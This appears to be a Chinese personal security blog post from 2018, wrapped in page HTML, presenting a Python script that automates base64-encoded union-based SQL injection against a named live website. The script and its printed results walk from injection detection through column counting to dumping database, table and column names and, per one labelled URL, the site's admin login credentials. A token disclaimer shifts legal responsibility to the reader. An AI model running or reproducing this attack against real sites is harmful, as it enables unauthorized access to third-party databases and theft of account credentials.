@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang=九世>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言上个星期说了base64注入，这个星期写个脚本不过分吧。[滑稽]，学校的校运会实数无聊比初中的校运会少了太多….   正文注明：这个脚本只是针对没有任何防御的url测试网站：http://yyyhhg.com/newsDetail.php?id=MTMPS:纯属测试，任何违法行为由你自己负责 思路：1.先判断是否有注入2.拼接各种payload3.读取数据 问题：在后面读取数据的时候，如何定位">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="base64注入脚本">
+<meta property="og:url" content="http://yoursite.com/2018/11/30/base64注入脚本/index.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言上个星期说了base64注入，这个星期写个脚本不过分吧。[滑稽]，学校的校运会实数无聊比初中的校运会少了太多….   正文注明：这个脚本只是针对没有任何防御的url测试网站：http://yyyhhg.com/newsDetail.php?id=MTMPS:纯属测试，任何违法行为由你自己负责 思路：1.先判断是否有注入2.拼接各种payload3.读取数据 问题：在后面读取数据的时候，如何定位">
+<meta property="og:locale" content="九世">
+<meta property="og:image" content="http://pic.netbian.com/uploads/allimg/180808/091612-1533690972027f.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/30/Fma7o4.png">
+<meta property="og:updated_time" content="2018-11-30T10:17:29.320Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="base64注入脚本">
+<meta name="twitter:description" content="前言上个星期说了base64注入，这个星期写个脚本不过分吧。[滑稽]，学校的校运会实数无聊比初中的校运会少了太多….   正文注明：这个脚本只是针对没有任何防御的url测试网站：http://yyyhhg.com/newsDetail.php?id=MTMPS:纯属测试，任何违法行为由你自己负责 思路：1.先判断是否有注入2.拼接各种payload3.读取数据 问题：在后面读取数据的时候，如何定位">
+<meta name="twitter:image" content="http://pic.netbian.com/uploads/allimg/180808/091612-1533690972027f.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>base64注入脚本</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/11/25/base64变形注入/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/30/base64注入脚本/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/30/base64注入脚本/&text=base64注入脚本"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/30/base64注入脚本/&is_video=false&description=base64注入脚本"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=base64注入脚本&body=Check out this article: http://yoursite.com/2018/11/30/base64注入脚本/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/30/base64注入脚本/&name=base64注入脚本&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        base64注入脚本
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-30T09:54:48.000Z" itemprop="datePublished">2018-11-30</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个星期说了base64注入，这个星期写个脚本不过分吧。[滑稽]，学校的校运会实数无聊<br>比初中的校运会少了太多….<br><img src="http://pic.netbian.com/uploads/allimg/180808/091612-1533690972027f.jpg" alt="091612-1533690972027f.jpg"></p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=451113443&auto=1&height=66"></iframe>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>注明：这个脚本只是针对没有任何防御的url<br>测试网站：<a href="http://yyyhhg.com/newsDetail.php?id=MTM" target="_blank" rel="noopener">http://yyyhhg.com/newsDetail.php?id=MTM</a><br>PS:纯属测试，任何违法行为由你自己负责</p>
+<p>思路：<br><code>1.先判断是否有注入</code><br><code>2.拼接各种payload</code><br><code>3.读取数据</code></p>
+<p>问题：<code>在后面读取数据的时候，如何定位到数据呢。然后列出来，我这里解决不了，就url+注入语句拼接起来，然后自己看，然后在输入到脚本</code></p>
+<p>代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">def sql_injection():</span><br><span class="line">    payload=base64.b64encode(bytes(&apos;13 and 1=1&apos;,encoding=&apos;utf-8&apos;))</span><br><span class="line">    payload2=base64.b64encode(bytes(&apos;13 and 1=2&apos;,encoding=&apos;utf-8&apos;))</span><br><span class="line">    payload3=base64.b64encode(bytes(&apos;13 order by 1&apos;,encoding=&apos;utf-8&apos;))</span><br><span class="line">    urls=&apos;http://yyyhhg.com/newsDetail.php?id=’</span><br><span class="line">    headers=&#123;&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&apos;&#125;</span><br><span class="line">    rqt=requests.get(url=urls+bytes.decode(payload),headers=headers)</span><br><span class="line">    rqt2=requests.get(url=urls + bytes.decode(payload2), headers=headers)</span><br><span class="line">    if rqt.text!=rqt2.text:  //判断是否有注入</span><br><span class="line">        print(&apos;[+] There is SQL injection.&apos;)</span><br><span class="line">        rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)</span><br><span class="line">        if rqt.text==rqt3.text:</span><br><span class="line">            print(&apos;[+] Try running fields&apos;)</span><br><span class="line">            for i in range(1,101):</span><br><span class="line">                payload3=base64.b64encode(bytes(&apos;13 order by &#123;&#125;&apos;.format(i),encoding=&apos;utf-8&apos;)) //跑字段范围1-100</span><br><span class="line">                rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)</span><br><span class="line">                if rqt3.text!=rqt.text: </span><br><span class="line">                    global field</span><br><span class="line">                    field=i-1</span><br><span class="line">                    print(&apos;[+] field:&#123;&#125;&apos;.format(i-1))</span><br><span class="line">                    payload3=base64.b64encode(bytes(&apos;13 order by &#123;&#125;&apos;.format(field), encoding=&apos;utf-8&apos;)) //将获取到的字段写入到txt</span><br><span class="line">                    print(&apos;[+] payload 3:&#123;&#125;&apos;.format(bytes.decode(base64.b64decode(payload3))))</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        if field!=&apos;&apos;:</span><br><span class="line">            xj=open(&apos;sqldk.txt&apos;,&apos;w&apos;)</span><br><span class="line">            xj.close()</span><br><span class="line">            for u in range(1,field+1):</span><br><span class="line">                print(&apos;,&apos;+str(u),end=&apos;&apos;,file=open(&apos;sqldk.txt&apos;,&apos;a&apos;))</span><br><span class="line">            with open(&apos;sqldk.txt&apos;,&apos;r&apos;) as p:</span><br><span class="line">                reads=p.read().replace(&apos;,1&apos;,&apos;1&apos;)</span><br><span class="line">                payload4=base64.b64encode(bytes(&apos;0 union select &#123;&#125;&apos;.format(reads),encoding=&apos;utf-8&apos;)) //获取显位</span><br><span class="line">                print(&apos;[+] obtain payload 4:&apos;,bytes.decode(base64.b64decode(payload4)))</span><br><span class="line">                rqt4=requests.get(url=urls+bytes.decode(payload4),headers=headers)</span><br><span class="line">                print(&apos;[+] Open URL to manually locate the display:&apos;,rqt4.url)</span><br><span class="line">                user=input(&apos;display:&apos;)</span><br><span class="line">                print(&apos;[+] The number of digits you enter is:&apos;,user)</span><br><span class="line">                payload4=bytes.decode(base64.b64decode(payload4)).replace(user,&apos;database()&apos;) //获取数据库名称</span><br><span class="line">                rqt5=requests.get(url=urls+bytes.decode(base64.b64encode(bytes(payload4,encoding=&apos;utf-8&apos;))),headers=headers)</span><br><span class="line">                print(&apos;[+] Manually open the URL to get the database name:&apos;,rqt5.url)</span><br><span class="line">                user2=input(&apos;database:&apos;)</span><br><span class="line">                js=binascii.hexlify(bytes(user2,encoding=&apos;utf-8&apos;))</span><br><span class="line">                js=&apos;0x&#123;&#125;&apos;.format(bytes.decode(js))</span><br><span class="line">                payload5=base64.b64encode(bytes(payload4.replace(&apos;database()&apos;,&apos;group_concat(table_name)&apos;)+&apos; &apos;+&apos;from information_schema.tables where table_schema=&#123;&#125;&apos;.format(js),encoding=&apos;utf-8&apos;)) //读取所有表名</span><br><span class="line">                rqt6=requests.get(url=urls+bytes.decode(payload5),headers=headers)</span><br><span class="line">                if rqt6.status_code==200:</span><br><span class="line">                    print(&apos;[+] Open the URL input field:&apos;,rqt6.url)</span><br><span class="line">                    user3=input(&apos;table_name:&apos;)</span><br><span class="line">                    payload6=bytes.decode(base64.b64decode(payload5)).replace(&apos;table_name&apos;,&apos;column_name&apos;).replace(&apos;tables&apos;,&apos;columns&apos;)+&apos; and table_name=&#123;&#125;&apos;.format(&apos;0x&apos;+bytes.decode(binascii.hexlify(bytes(user3,encoding=&apos;utf-8&apos;))))</span><br><span class="line">                    payload6=base64.b64encode(bytes(payload6,encoding=&apos;utf-8&apos;)) //读取所有字段名</span><br><span class="line">                    rqt7=requests.get(url=urls+bytes.decode(payload6),headers=headers)</span><br><span class="line">                    if rqt7.status_code==200:</span><br><span class="line">                        print(&apos;[+] Open URL input field name:&apos;,rqt7.url)</span><br><span class="line">                        print(&apos;[+] If there are multiple field names, separate them&apos;)</span><br><span class="line">                        user4=input(&apos;column_name:&apos;)</span><br><span class="line">                        payload7=base64.b64encode(bytes(&apos;0 union select &apos;+reads.replace(user,&apos;group_concat(&#123;&#125;)&apos;.format(user4))+&apos; from &#123;&#125;&apos;.format(user3),encoding=&apos;utf-8&apos;)) //读取字段内容</span><br><span class="line">                        rqt8=requests.get(url=urls+bytes.decode(payload7),headers=headers)</span><br><span class="line">                        if rqt8.status_code==200:</span><br><span class="line">                            print(&apos;[+] Completed injection:&apos;,rqt8.url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] No SQL injection exists.&apos;)</span><br><span class="line">        exit()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sql_injection()</span><br></pre></td></tr></table></figure>
+<p>测试结果：<br><img src="https://s1.ax1x.com/2018/11/30/Fma7o4.png" alt="Fma7o4.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取位数的ur: http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==</span><br><span class="line"></span><br><span class="line">获取所有表名的url:http://yyyhhg.com/newsDetail</span><br><span class="line">.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCksNCw1LDYsNw==</span><br><span class="line"></span><br><span class="line">获取所有字段的url:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiB</span><br><span class="line">WxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9</span><br><span class="line">3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0weDc5Nzk3OTY4NjcgYW5kIHRhYmxlX25</span><br><span class="line">WU9MHg2YzZmNjc2OTZlNzU3MzY1NzI=</span><br><span class="line"></span><br><span class="line">获取后台账号:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3Q</span><br><span class="line">gMSwyLGdyb3VwX2NvbmNhdCgsdXNlck5hbWUscHdkKSw0LDUsNiw3IGZyb20gbG9naW51c2Vy</span><br></pre></td></tr></table></figure>
+<p>转载请注明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/30/base64注入脚本/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/30/base64注入脚本/&text=base64注入脚本"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/30/base64注入脚本/&is_video=false&description=base64注入脚本"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=base64注入脚本&body=Check out this article: http://yoursite.com/2018/11/30/base64注入脚本/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/30/base64注入脚本/&title=base64注入脚本"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/30/base64注入脚本/&name=base64注入脚本&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
